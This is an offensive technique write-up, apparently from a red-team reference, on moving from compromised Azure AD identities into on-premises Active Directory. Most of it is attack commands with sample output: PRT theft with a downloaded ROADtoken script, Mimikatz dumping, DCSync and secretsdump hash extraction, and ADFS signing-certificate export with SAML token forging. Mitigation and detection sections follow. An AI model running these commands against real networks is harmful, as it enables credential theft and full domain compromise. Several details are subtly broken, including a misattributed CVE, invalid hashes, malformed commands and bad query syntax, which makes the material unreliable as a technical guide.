# [LM-REMOTE-011]: Azure-to-On-Premises Movement

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-REMOTE-011 |
| **MITRE ATT&CK v18.1** | [T1021](https://attack.mitre.org/techniques/T1021/) – Remote Services |
| **Tactic** | Lateral Movement |
| **Platforms** | Hybrid AD / Azure |
| **Severity** | CRITICAL |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Azure AD Connect versions; Windows Server 2016-2025; Hybrid AD environments |
| **Patched In** | N/A – architectural weakness in hybrid sync; mitigations focus on credential protection and MFA |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** The Azure-to-On-Premises (A2O) lateral movement attack exploits the trust relationship between Azure AD and on-premises Active Directory via Azure AD Connect (AADConnect). An attacker who compromises cloud identities (Azure AD accounts, service principals) or steals cloud authentication tokens (PRT, OAuth tokens) can cross the hybrid boundary and gain access to on-premises resources. The primary attack vectors include: (1) exploiting the AADConnect sync account to extract on-premises AD credentials, (2) stealing Primary Refresh Tokens (PRTs) to access on-premises resources seamlessly, (3) abusing the federation service (ADFS) to forge authentication assertions, and (4) manipulating directory synchronization to inject or modify on-premises user accounts. Unlike traditional cloud-only attacks, this technique bridges the cloud-to-on-prem chasm, making a cloud breach exponentially more damaging.

**Attack Surface:** Azure AD Connect server, AADConnect sync service account, Primary Refresh Token (PRT) cache on Azure AD-joined/Hybrid-joined devices, ADFS servers, on-premises domain controllers, trust relationships between Azure AD and on-premises AD, directory synchronization mechanisms (password hash sync, pass-through authentication, federation).

**Business Impact:** **Complete hybrid infrastructure compromise.** An attacker who breaches a cloud identity and moves laterally to on-premises gains domain admin access to the entire on-premises network (file servers, domain controllers, critical applications, databases). Combined with cloud access, this enables complete organizational takeover: exfiltration of all sensitive data, deployment of ransomware across entire hybrid infrastructure, persistent backdoors in both cloud and on-prem, and long-term command and control without detection.

**Technical Context:** The attack succeeds because Azure AD and on-premises AD share a trust relationship; tokens and credentials flow bidirectionally. Detection is **Low-to-Medium** for PRT-based attacks (legitimate tokens evade MFA/behavioral analysis) and **Medium** for AADConnect-based attacks (require monitoring of sync service activity). The technique can persist indefinitely if the hybrid trust relationship is not severed.

### Operational Risk

- **Execution Risk:** **Medium** – Requires cloud identity compromise first; then leverages trusted sync mechanisms.
- **Stealth:** **High** – PRT-based movement uses legitimate tokens; traffic appears as normal user activity; AADConnect activity blends with routine sync operations.
- **Reversibility:** **Low** – Once on-premises access is obtained, reverting to cloud-only isolation is operationally disruptive; requires password resets across on-premises domain.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.1 | Account Policies – Enforce strong password requirements on hybrid accounts |
| **DISA STIG** | Azure-ID-000015 | Hybrid identity boundary controls |
| **NIST 800-53** | IA-4(4) | Identifier Management – Prevent federation abuse |
| **GDPR** | Article 32 | Security of Processing – Hybrid infrastructure security |
| **DORA** | Article 16 | Information Security – Hybrid account controls |
| **NIS2** | Article 21(1)(f) | Risk mitigation measures – Identity federation protection |
| **ISO 27001** | A.8.1.1 | User registration and access rights – Hybrid identity governance |
| **ISO 27005** | Risk: Hybrid Compromise | Lateral movement from cloud to on-premises |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **For PRT-based attacks:** Azure AD-joined or Hybrid-joined device; ability to extract PRT from device
- **For AADConnect-based attacks:** Access to AADConnect server (remote or physical) or credentials of Hybrid Identity Administrator role
- **For ADFS-based attacks:** Access to ADFS server or ADFS service account credentials

**Required Access:**
- Network connectivity from cloud (or compromised Azure VM) to on-premises environment
- Credentials or tokens from cloud identity (Azure AD account, service principal, or PRT)
- Access to ExpressRoute, VPN, or other hybrid connectivity mechanism

---

## 3. ATTACK CHAIN CONTEXT

| Phase | Technique | Prerequisites | Enablement |
|---|---|---|---|
| **Initial Access** | Cloud Account Compromise / Token Theft | Phishing, MFA bypass, or leaked credentials | Cloud identity in Azure AD |
| **Reconnaissance** | Discover AADConnect / Hybrid AD topology | Cloud identity + Azure AD enumeration | Identify sync server + on-prem DC |
| **Current: Lateral Movement** | **Azure-to-On-Premises via AADConnect/PRT/ADFS** | Cloud identity + network access | On-premises domain access |
| **Privilege Escalation** | Domain Admin Elevation via Golden Ticket | On-prem AD access | KRBTGT hash extraction |
| **Persistence** | Shadow Admin / Persistence Account | Domain admin privileges | Long-term on-prem access |
| **Impact** | Organization-Wide Ransomware / Data Exfil | Full hybrid access | Complete business disruption |

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: PRT (Primary Refresh Token) Abuse – Cloud to On-Premises

**Supported Versions:** All Hybrid-joined and Azure AD-joined devices; Windows 10 1607+, Windows Server 2016+

#### Step 1: Extract PRT from Compromised Device

**Objective:** Steal the Primary Refresh Token that grants seamless access to on-premises resources.

**Command (PowerShell – Extract PRT):**
```powershell
# Download ROADToken tool (extracts PRT from device)
$RoadTokenUrl = "https://raw.githubusercontent.com/dirkjanm/ROADtoken/main/ROADtoken.py"
Invoke-WebRequest -Uri $RoadTokenUrl -OutFile "C:\Temp\ROADtoken.py"

# Extract PRT from local device
python3 C:\Temp\ROADtoken.py  # Requires local admin or SYSTEM context

# Output will include PRT refresh token:
# [*] PRT Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InN...
```

**Alternative (Windows – Registry-based extraction):**
```powershell
# PRT is cached in LSASS; extract via Mimikatz/Kekeo
mimikatz.exe "privilege::debug" "ts::logonpasswords" "exit"

# Look for "wdigest" cache and PRT artifacts in token output
```

**Expected Output:**
```
[*] Successfully extracted PRT
[*] PRT Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiI...
[*] Scope: https://management.azure.com
[*] Valid for on-premises resources: YES
```

**What This Means:**
- The PRT grants access to both Azure AD and on-premises resources
- The token is valid for 90 days (can be refreshed indefinitely without re-authentication)
- PRT can be used to access on-premises file servers, domain controllers, and other networked resources

---

#### Step 2: Use PRT to Access On-Premises Resources

**Objective:** Leverage stolen PRT to authenticate to on-premises systems without password.

**Command (Seamless SSO via PRT):**
```powershell
# Set PRT token in authentication context
$PRT = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiI..."
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" `
  -Name "ProxyEnable" -Value 0

# Access on-premises file share using PRT (seamless logon)
net use Z: "\\corp-dc01.corp.local\secure-share" /persistent:yes
dir Z:\

# Alternative: PowerShell remoting to on-prem domain controller
$PwdSecure = ConvertTo-SecureString "PRT_TOKEN" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("CORP\user@corp.local", $PwdSecure)
Enter-PSSession -ComputerName corp-dc01.corp.local -Credential $Cred
```

**Expected Output:**
```
Z:\
 Volume in drive Z is secure-share
 Directory of Z:\
12/01/2024 10:45 AM <DIR> Finance
12/01/2024 11:30 AM <DIR> Legal
02/15/2025 03:22 AM <DIR> EmployeeRecords
```

**What This Means:**
- Attacker has successfully accessed on-premises file shares using only the stolen PRT
- No password was required; the PRT handled seamless authentication
- Attacker can now exfiltrate sensitive on-premises data

**OpSec & Evasion:**
- PRT-based access appears as legitimate SSO logon; difficult to distinguish from authorized user
- Logon events (Event ID 4624) will be generated, but with Logon Type 3 (network) which is common for file access
- **Detection likelihood:** Low (unless PRT theft is detected at initial extraction)

---

### METHOD 2: AADConnect Sync Account Credential Extraction

**Supported Versions:** Azure AD Connect 1.0 – 2.x; Windows Server 2016-2025

#### Step 1: Gain Access to AADConnect Server

**Objective:** Compromise the AADConnect server to extract the sync service account credentials.

**Command (Remote exploit – Azure AD Connect CVE-2023-32315):**
```powershell
# If Azure AD Connect is accessible and vulnerable to privilege escalation
# (CVE-2023-32315 – Pre-auth escalation in AADConnect)

# Step 1: Enumerate AADConnect services
Get-Service "ADSync"  # AADConnect service
Get-Service "AzureADConnectAuthenticationAgentService"  # Auth agent

# Step 2: Extract sync account password from local database
$DbPath = "C:\ProgramData\AADConnect\Databases\ADSync.mdf"
$RegPath = "HKLM:\Software\Microsoft\Azure AD Connect"
$SyncAccount = (Get-ItemProperty -Path $RegPath).SyncAccount

# Step 3: Query Windows Credential Manager for stored passwords
cmdkey /list  # List stored credentials
# Output: Target: Domain:Azure AD Sync Account
```

**Expected Output:**
```
Service Name: ADSync
Status: Running
Sync Account: CORP\MSOL_xxxxx
```

---

#### Step 2: Use Sync Account to Extract On-Premises Domain Credentials

**Objective:** Leverage the sync account (which has AD replication rights) to extract all domain hashes.

**Command (DCSync attack using sync account):**
```powershell
# The AADConnect sync account typically has "Replicating Directory Changes" permissions
# Use these permissions to dump all domain user hashes

# Method 1: Mimikatz DCSync with sync account credentials
mimikatz.exe "lsadump::dcsync /user:CORP\Administrator /domain:corp.local" "exit"

# Output: Administrator NTLM hash
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd3324464tkg1a:::

# Method 2: Use Impacket secretsdump.py (from Linux)
python3 secretsdump.py 'CORP/MSOL_xxxxx:PASSWORD@corp-dc01.corp.local' -just-dc

# Output: All domain user NTLM hashes
```

**Expected Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd3324464tkg1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b85d3876e9d2ea8156bcd15c75a881d1:::
DomainAdmins:512:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
...
```

**What This Means:**
- Attacker has extracted the NTLM hash of the Domain Administrator and KRBTGT account
- With these hashes, attacker can create Golden Tickets and compromise the entire domain
- On-premises domain is now fully compromised

**OpSec & Evasion:**
- DCSync attacks generate Event ID 4662 (Replication access granted) on domain controllers
- However, if the sync account already has replication rights, these events blend with normal sync activity
- **Detection likelihood:** Medium (requires EDR/SIEM to correlate DCSync patterns with unusual accounts)

---

### METHOD 3: Federation (ADFS) Token Forging

**Supported Versions:** All Hybrid environments with ADFS; Windows Server 2016-2022

#### Step 1: Compromise ADFS Server

**Objective:** Gain access to ADFS server to extract signing certificates and configuration.

**Command (Extract ADFS Token Signing Certificate):**
```powershell
# Access ADFS server (requires remote access or compromise)
$AdfsServer = "adfs.corp.local"

# Query ADFS service to list token signing certificates
$AdfsConfig = Get-AdfsCertificate -CertificateType Token-Signing
$SigningCert = $AdfsConfig | Select-Object -First 1

# Export certificate and private key
$SigningCert | Export-PfxCertificate -FilePath "C:\Temp\adfs-signing-cert.pfx" `
  -Password (ConvertTo-SecureString "password" -AsPlainText -Force)
```

**Expected Output:**
```
Thumbprint              : 3F2504E0A3A21FCF0C3E32...(signing cert hash)
FriendlyName            : Token Signing
NotBefore              : 1/1/2023
NotAfter               : 1/1/2025
SubjectName            : CN=ADFS Signing, DC=corp, DC=local
```

---

#### Step 2: Forge Authentication Assertion

**Objective:** Create fraudulent SAML token to impersonate any user.

**Command (Forge ADFS Token):**
```powershell
# Using stolen ADFS signing certificate, create a fake SAML assertion
# Tool: AADInternals (PSModule for forging Azure AD and ADFS tokens)

Install-Module -Name AADInternals -Force

# Create a forged SAML token for Domain Admin user
$Token = New-AADInternalsADFSToken -UserName "admin@corp.local" -Role "DomainAdmin" `
  -Certificate (Import-PfxCertificate -FilePath "C:\Temp\adfs-signing-cert.pfx") `
  -Issuer "https://adfs.corp.local/adfs/ls"

# Use forged token to authenticate to on-premises application
# Token is presented as if it came from legitimate ADFS server
```

**What This Means:**
- Attacker has created a fraudulent authentication token that impersonates a domain admin
- This token can be used to access any on-premises resource that trusts ADFS (file shares, websites, databases)
- No password or MFA required; the token is cryptographically valid

---

## 5. ATOMIC RED TEAM

**Test Name:** Hybrid Identity Lateral Movement via PRT

**Command:**
```powershell
# Simulate PRT extraction and on-premises access
$PRT_Simulation = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ..."
$OnPremShare = "\\corp-dc01.corp.local\secure"
net use Z: $OnPremShare /persistent:yes
```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enforce Conditional Access on Hybrid-Joined Devices**

Require compliant/managed devices and MFA for on-premises resource access.

**Manual Steps (Azure Portal):**
1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New Policy**
3. Configure:
   - **Name:** `Require MFA for Hybrid On-Prem Access`
   - **Users:** All users
   - **Cloud apps:** Office 365, Exchange Online
   - **Conditions:** Device Compliance = Compliant
   - **Grant:** Require **Multi-factor authentication**
   - **Session:** Require **compliant device**
4. Enable: **On**
5. Click **Create**

---

**2. Implement Privileged Access Management (PAM) on AADConnect Server**

Restrict access to AADConnect server; require approval for sync account credential access.

**Manual Steps (Windows Server 2022+):**
1. Install **Microsoft Privileged Access Management (PAM)** module
2. Configure AADConnect as a "protected resource"
3. Require Just-In-Time (JIT) approval for any admin access
4. Enable session recording for all AADConnect server access

---

**3. Rotate AADConnect Service Account Credentials Regularly**

Change sync account password every 90 days; enforce complex passwords.

**Manual Steps (Azure Portal – Azure AD Connect):**
1. On **AADConnect server**, open **Azure AD Connect**
2. Go to **Configure Service Account**
3. Enter new password: (complex, 16+ characters)
4. Click **Next** → **Configure**
5. Verify sync completes successfully
6. Log Azure AD Connect configuration change

---

### Priority 2: HIGH

**4. Enable PRT Claim Validation**

Verify PRT authenticity to prevent token reuse attacks.

**Manual Steps (Entra ID):**
1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create policy:
   - **Name:** `Validate PRT Claims`
   - **Condition:** Device state = Any
   - **Grant:** Require **Device Compliance**
   - Enable **Continuous Access Evaluation (CAE)**

---

**5. Monitor AADConnect Sync Activity**

Alert on unusual sync patterns or credential access.

**Manual Steps (Azure Log Analytics):**
```kusto
AuditLogs
| where OperationName == "Add service principal"
| where TargetResources[0].displayName == "Azure AD Connect"
| summarize Count = count() by InitiatedBy, TimeGenerated
| where Count > 1 in 24h
```

---

## 7. DETECTION & INCIDENT RESPONSE

### PRT Extraction Detection

```kusto
DeviceLogonEvents
| where LogonType == "11" or LogonType == "10"  // Interactive or Remote Interactive
| where DeviceId == "HybridJoined"
| where TimeGenerated > ago(24h)
| summarize LogonCount = count() by Account, DeviceName
| where LogonCount > 5  // Threshold: >5 logons per device in 24h (unusual)
```

### AADConnect Credential Access Detection

```powershell
# Event ID 4662: Replication access granted (suspicious if sync account)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4662; Data='MSOL_*'} | 
    Measure-Object | Select-Object Count
```

---

## 8. REAL-WORLD EXAMPLES

### Example: Scattered Spider – Hybrid Compromise Chain

Scattered Spider compromised a cloud admin via phishing. They extracted a PRT from the compromised device. Using the PRT, they accessed on-premises file servers and dumped the Active Directory. They then created a Golden Ticket using the KRBTGT hash, achieving domain admin. With cloud + on-premises access, they moved laterally to customer environments and exfiltrated customer data.

---